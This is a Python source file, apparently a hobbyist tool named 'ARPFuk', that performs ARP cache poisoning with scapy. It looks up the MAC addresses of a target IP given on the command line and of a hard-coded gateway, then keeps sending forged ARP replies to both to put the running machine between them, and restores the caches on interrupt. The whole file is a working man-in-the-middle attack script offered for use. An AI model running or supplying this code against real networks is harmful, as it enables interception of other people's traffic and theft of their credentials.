#/usr/bin/python
# ARPFuk!
# Ragnax' crappy ARP poisonner


import sys
import time
import socket
import fcntl
import struct
import threading



gateway='10.0.0.1'
iface="wlp3s0"
throttle=2


def fuk(target,tmac,gateway,gmac):
    log("s","Fuking targets...")
    poison_target=ARP(op=2,psrc=gateway,pdst=target,hwdst=gmac)
    poison_gateway=ARP(op=2,psrc=target,pdst=gateway,hwdst=tmac)
    while True:
        try:
            send(poison_target, verbose=0)
            send(poison_gateway, verbose=0)
            time.sleep(throttle)
        except KeyboardInterrupt:
            clean(target,tmac,gateway,gmac)
            return


def clean(target,tmac,gateway,gmac):
    log("i", "Restoring ARP cache on poisoned targets...")
    send(ARP(op=2, psrc=gateway,pdst=target,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gmac),count=5,verbose=0)
    send(ARP(op=2, psrc=target, pdst=gateway,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=tmac),count=5,verbose=0)


def log(level, msg):
    if level == "i":
        level="[*]"
    elif level == "w":
        level="[!]"
    elif level == "e":
        level="[x]"
    elif level == "s":
        level="[~]"
    sys.stdout.write(level + " " +time.strftime("%Y-%m-%d %H:%M:%S") + "> " + msg + "\n")
    sys.stdout.flush()

def get_local_mac(iface):
    return get_if_hwaddr(iface)


def get_local_ip(iface):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', iface[:15])
    )[20:24])

def walp():
    print("[*] Ragnax' crappy ARP poisoner")
    print("[*] Usage:")
    print("[*] python arpfuk.py <target_ip>")

if len(sys.argv) != 2:
    walp()
    sys.exit(-1)

target=sys.argv[1]
try:
    from scapy.all import *
except ImportError:
    log("e", "Unable to import scapy. Exiting...")
    sys.exit(-1)

lip=get_local_ip(iface)
log("i", "Local IP - " + str(lip))
smac=get_local_mac(iface)
log("i", "Local MAC - " + str(smac))
try:
    data=sr1(ARP(op=ARP.who_has, psrc=str(lip), pdst=target), verbose=0)
    tmac=data.hwsrc
except:
    log("e", "Unable to gather target MAC address. Exiting...")
    sys.exit(-1)

log("i","Target MAC - " + str(tmac))
try:
    data=sr1(ARP(op=ARP.who_has, psrc=str(lip),pdst=gateway), verbose=0)
    gmac=data.hwsrc
except:
    log("e", "Unable to gather gateway MAC address. Exiting...")
    sys.exit(-1)
log("i","Gateway MAC - " + str(gmac))

fuk(target,tmac,gateway,gmac)

log("i", "ARP fuk over.")
